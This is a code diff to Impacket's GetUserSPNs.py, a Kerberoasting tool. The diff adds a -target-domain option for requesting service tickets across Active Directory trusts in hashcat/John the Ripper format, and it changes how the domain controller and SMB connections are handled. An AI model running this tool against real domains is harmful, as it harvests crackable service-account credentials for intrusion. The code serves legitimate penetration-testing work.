@@ -49,7 +49,6 @@ from impacket.ldap import ldap, ldapasn1
 from impacket.smbconnection import SMBConnection
 from impacket.ntlm import compute_lmhash, compute_nthash
 
-
 class GetUserSPNs:
     @staticmethod
     def printTable(items, header):
@@ -68,10 +67,11 @@ class GetUserSPNs:
         for row in items:
             print outputFormat.format(*row)
 
-    def __init__(self, username, password, domain, cmdLineOptions):
+    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
         self.__username = username
         self.__password = password
-        self.__domain = domain
+        self.__domain = user_domain
+        self.__targetDomain = target_domain
         self.__lmhash = ''
         self.__nthash = ''
         self.__outputFileName = cmdLineOptions.outputfile
@@ -85,26 +85,37 @@ class GetUserSPNs:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
 
         # Create the baseDN
-        domainParts = self.__domain.split('.')
+        domainParts = self.__targetDomain.split('.')
         self.baseDN = ''
         for i in domainParts:
             self.baseDN += 'dc=%s,' % i
         # Remove last ','
         self.baseDN = self.baseDN[:-1]
+        # We can't set the KDC to a custom IP when requesting things cross-domain
+        # because then the KDC host will be used for both
+        # the initial and the referral ticket, which breaks stuff.
+        if user_domain != target_domain and self.__kdcHost:
+            logging.warning('DC ip will be ignored because of cross-domain targeting.')
+            self.__kdcHost = None
 
     def getMachineName(self):
-        if self.__kdcHost is not None:
+        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
             s = SMBConnection(self.__kdcHost, self.__kdcHost)
         else:
-            s = SMBConnection(self.__domain, self.__domain)
+            s = SMBConnection(self.__targetDomain, self.__targetDomain)
         try:
             s.login('', '')
         except Exception:
             if s.getServerName() == '':
                 raise('Error while anonymous logging into %s' % self.__domain)
         else:
-            s.logoff()
-        return s.getServerName()
+            try:
+                s.logoff()
+            except Exception:
+                # We don't care about exceptions here as we already have the required
+                # information. This also works around the current SMB3 bug
+                pass
+        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())
 
     @staticmethod
     def getUnixTime(t):
@@ -235,10 +246,10 @@ class GetUserSPNs:
         if self.__doKerberos:
             target = self.getMachineName()
         else:
-            if self.__kdcHost is not None:
+            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                 target = self.__kdcHost
             else:
-                target = self.__domain
+                target = self.__targetDomain
 
         # Connect to LDAP
         try:
@@ -371,6 +382,8 @@ if __name__ == '__main__':
                                                                     "under a user account")
 
     parser.add_argument('target', action='store', help='domain/username[:password]')
+    parser.add_argument('-target-domain', action='store', help='Domain to query/request if different than the domain of the user. '
+                                                               'Allows for Kerberoasting across trusts.')
     parser.add_argument('-request', action='store_true', default='False', help='Requests TGS for users and output them '
                                                                                'in JtR/hashcat format (default False)')
     parser.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
@@ -393,7 +406,8 @@ if __name__ == '__main__':
                                                                             '(128 or 256 bits)')
     group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                                                               'ommited it use the domain part (FQDN) '
-                                                                              'specified in the target parameter')
+                                                                              'specified in the target parameter. Ignored'
+                                                                              'if -target-domain is specified.')
 
     if len(sys.argv)==1:
         parser.print_help()
@@ -410,16 +424,21 @@ if __name__ == '__main__':
     # This is because I'm lazy with regex
     # ToDo: We need to change the regex to fullfil domain/username[:password]
     targetParam = options.target+'@'
-    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(targetParam).groups('')
+    userDomain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(targetParam).groups('')
 
     #In case the password contains '@'
     if '@' in address:
         password = password + '@' + address.rpartition('@')[0]
         address = address.rpartition('@')[2]
 
-    if domain is '':
-        logging.critical('Domain should be specified!')
+    if userDomain is '':
+        logging.critical('userDomain should be specified!')
         sys.exit(1)
+
+    if options.target_domain:
+        targetDomain = options.target_domain
+    else:
+        targetDomain = userDomain
 
     if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
         from getpass import getpass
@@ -432,7 +451,7 @@ if __name__ == '__main__':
         options.request = True
 
     try:
-        executer = GetUserSPNs(username, password, domain, options)
+        executer = GetUserSPNs(username, password, userDomain, targetDomain, options)
         executer.run()
     except Exception, e:
         if logging.getLogger().level == logging.DEBUG:
